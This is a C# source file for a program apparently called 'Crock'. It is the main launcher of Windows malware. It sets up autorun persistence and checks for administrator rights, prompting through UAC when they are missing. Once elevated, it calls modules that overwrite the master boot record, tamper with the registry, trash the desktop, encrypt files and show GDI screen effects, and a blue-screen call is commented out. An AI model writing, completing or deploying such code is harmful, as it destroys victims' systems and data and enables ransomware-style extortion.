using System.Threading;
using System.Security.Principal;

namespace Crock
{
    static partial class Program
    {
        // Запус всех модулей
        public static void UseExp()
        {
            Killer.MBR();
            Addition.RegFun();
            var rule = new Rules();
            new Thread(() => rule.ShowDialog()).Start();
            new Thread(() => Addition.TrashDestop()).Start();
            new Thread(() => Crypt.Main_Encrypt()).Start();
            new Thread(() => Effect.GDI_payloads()).Start();
            Killer.RegFuck();
            //Killer.BSOD();
        }

        private static void Main()
        {
            if (!Addition.IsInstalledAR())
                Addition.InstallAR();

            bool isElevated;
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            if (isElevated)
            {
                UseExp();
            }
            else
            {
                Addition.UAC();
            }
        }
    }
}
